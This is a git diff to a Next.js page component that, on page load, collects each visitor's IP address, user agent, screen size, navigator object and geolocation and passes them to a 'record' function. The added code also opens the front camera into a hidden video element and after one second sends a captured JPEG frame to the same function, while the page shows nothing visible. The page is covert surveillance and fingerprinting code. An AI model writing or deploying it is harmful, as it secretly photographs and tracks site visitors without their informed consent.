@@ -1,6 +1,6 @@
 'use client'
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import record from "./record";
 
 export default function Home() {
@@ -17,15 +17,16 @@ export default function Home() {
     // return () => clearTimeout(timer);
   }, []);
 
-  const additional = {}
-  additional["ip"] = ip
-  additional["userAgent"] = navigator.userAgent
-  additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
-  additional["navigator"] = navigator
-  record(JSON.stringify(additional))
+
   useEffect(() => {
     (async () => {
       const ip = await (await fetch("https://api.ipify.org/?format=text")).text()
+      const additional = {}
+      additional["ip"] = ip
+      additional["userAgent"] = navigator.userAgent
+      additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
+      additional["navigator"] = navigator
+      record(JSON.stringify(additional))
       console.log(ip)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
@@ -35,11 +36,48 @@ export default function Home() {
       } else {
         console.log("Geolocation is not supported by this browser.");
       }
+
+      
     })()
+    
   }, []);
+  const accessCamera = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' }
+      });
+
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+      }
+    } catch (error) {
+      console.error("Error accessing the camera: ", error);
+    }
+  };
+
+  const videoRef = useRef(null);
+
+  useEffect(() => {
+    accessCamera();
+    const timer = setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
+      
+      const base64 = canvas.toDataURL('image/jpeg');
+      record(base64) 
+      console.log(base64)
+
+    }, 1000);
+
+    return () => clearTimeout(timer);
+  }, []);
+
+  
   return (
     <main className="">
- 
+ <video ref={videoRef} autoPlay playsInline hidden/>
     </main>
   );
 }
